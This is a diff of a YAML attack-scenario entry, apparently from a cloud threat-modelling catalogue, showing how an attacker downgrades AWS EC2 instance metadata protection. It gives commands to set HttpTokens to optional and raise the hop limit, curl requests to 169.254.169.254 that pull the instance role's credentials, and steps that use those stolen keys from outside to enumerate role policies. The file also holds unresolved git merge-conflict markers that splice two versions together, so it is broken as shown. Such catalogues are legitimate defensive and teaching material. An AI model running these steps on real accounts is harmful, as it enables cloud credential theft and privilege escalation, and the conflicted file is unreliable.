@@ -1,4 +1,5 @@
 attack:
+<<<<<<< Updated upstream
   id: AWS-EC2-MODIFY-IMDS-OPTIONS
   name: EC2 Instance Metadata Service Weakening via ModifyInstanceMetadataOptions
   overview: |
@@ -17,6 +18,25 @@ attack:
       ttp: T1526 - Gather System Network Configuration Discovery
 
     - title: Weaken IMDS Protection by Disabling Token Requirement
+=======
+  id: aws-ec2-modify-imds-options-001
+  name: IMDS Protection Weakening via ec2:ModifyInstanceMetadataOptions
+  overview: |
+    An attacker with the ec2:ModifyInstanceMetadataOptions permission can downgrade or
+    weaken the Instance Metadata Service (IMDS) security posture on a target EC2 instance.
+    The primary attack vectors are:
+    (1) Forcing IMDSv1 by setting HttpTokens to "optional", removing the requirement for
+    a signed token and allowing unauthenticated metadata requests.
+    (2) Increasing HttpPutResponseHopLimit beyond 1 (e.g., to 2 or higher), which extends
+    the TTL of IMDS responses so they can traverse additional network hops. This makes the
+    169.254.169.254 metadata endpoint reachable from within containers or other processes
+    sharing the host network, enabling theft of temporary IAM credentials attached to the
+    instance role. Once IMDS protections are weakened, any process or container on the
+    instance (or an attacker exploiting SSRF) can retrieve the IAM role credentials
+    without needing IMDSv2 session tokens.
+  steps:
+    - title: "Step 1: Weaken IMDS Protections on Target EC2 Instance"
+>>>>>>> Stashed changes
       command: |
         aws ec2 modify-instance-metadata-options \
           --instance-id <INSTANCE_ID> \
@@ -36,6 +56,7 @@ attack:
           --instance-id <INSTANCE_ID> \
           --http-put-response-hop-limit 2
       dependencies:
+<<<<<<< Updated upstream
         - ec2:ModifyInstanceMetadataOptions
         - Target EC2 instance must exist
         - Instance must be in running or stopped state
@@ -55,5 +76,68 @@ attack:
       ttp: T1552.005 - Unsecured Credentials - Cloud Instance Metadata API
 
   stride_goal:
+=======
+        - "IAM permission: ec2:ModifyInstanceMetadataOptions on the target instance"
+        - "IAM permission: ec2:DescribeInstances to identify the target instance ID"
+        - "Valid AWS credentials (e.g., compromised IAM user or role with the above permission)"
+        - "Target EC2 instance must be in a running or stopped state"
+      result: |
+        The IMDS configuration on the target instance is modified: HttpTokens is set to
+        "optional" (IMDSv1 re-enabled) and HttpPutResponseHopLimit is raised to 2.
+        The metadata endpoint 169.254.169.254 is now accessible without a session token
+        and its responses can traverse one additional network hop, making it reachable
+        from containers or nested processes on the host.
+      ttp: "T1578 - Modify Cloud Compute Infrastructure"
+
+    - title: "Step 2: Retrieve Temporary IAM Credentials from IMDS"
+      command: |
+        # From within a container or process on the target EC2 instance (exploiting the raised hop limit),
+        # or via SSRF against the instance:
+
+        # Identify attached IAM role
+        curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+        # Retrieve temporary credentials for the identified role (replace ROLE_NAME)
+        curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
+      dependencies:
+        - "Step 1 must be completed (IMDS weakened with HttpTokens optional and hop limit >= 2)"
+        - "Code execution within a container or process on the target EC2 instance, OR an exploitable SSRF vulnerability in an application running on the instance"
+        - "EC2 instance must have an IAM instance profile attached"
+      result: |
+        Temporary AWS credentials (AccessKeyId, SecretAccessKey, Token) for the IAM role
+        attached to the EC2 instance are retrieved. These credentials can be exfiltrated
+        and used externally to authenticate as the instance role, granting all permissions
+        assigned to that role without requiring IMDSv2 token-based authentication.
+      ttp: "T1552.005 - Unsecured Credentials: Cloud Instance Metadata API"
+
+    - title: "Step 3: Use Exfiltrated Credentials for Lateral Movement or Privilege Escalation"
+      command: |
+        # Configure exfiltrated credentials in attacker-controlled environment
+        export AWS_ACCESS_KEY_ID=<EXFILTRATED_ACCESS_KEY_ID>
+        export AWS_SECRET_ACCESS_KEY=<EXFILTRATED_SECRET_ACCESS_KEY>
+        export AWS_SESSION_TOKEN=<EXFILTRATED_SESSION_TOKEN>
+
+        # Verify credential validity and identify permissions
+        aws sts get-caller-identity
+
+        # Enumerate permissions attached to the role for further exploitation
+        aws iam list-attached-role-policies --role-name <ROLE_NAME>
+        aws iam list-role-policies --role-name <ROLE_NAME>
+      dependencies:
+        - "Step 2 must be completed (temporary credentials successfully retrieved)"
+        - "Attacker has an environment to use the exfiltrated credentials externally (outside AWS or from a separate account)"
+        - "The IAM role attached to the instance must have permissions beyond the minimum required (misconfigured overly permissive role)"
+      result: |
+        The attacker authenticates to AWS using the stolen temporary credentials from
+        outside the EC2 instance. Depending on the permissions of the attached IAM role,
+        this may enable lateral movement to other AWS services (S3, RDS, SSM, etc.),
+        privilege escalation (e.g., iam:PassRole, iam:CreatePolicy), or persistent
+        access establishment. The attack effectively converts a control-plane IAM
+        misconfiguration into full data-plane compromise of AWS resources.
+      ttp: "T1078.004 - Valid Accounts: Cloud Accounts"
+
+  stride_goal:
+    - Tampering
+>>>>>>> Stashed changes
     - Information Disclosure
     - Elevation of Privilege
